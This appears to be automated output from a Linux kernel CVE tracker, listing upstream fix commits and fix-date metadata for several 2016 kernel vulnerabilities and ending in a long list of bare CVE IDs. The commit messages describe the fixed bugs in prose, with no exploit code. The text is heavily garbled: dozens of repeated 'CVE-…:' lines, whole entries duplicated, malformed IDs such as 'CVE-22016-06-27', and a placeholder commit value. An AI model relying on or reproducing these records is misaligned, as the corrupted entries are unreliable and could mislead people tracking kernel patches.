CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
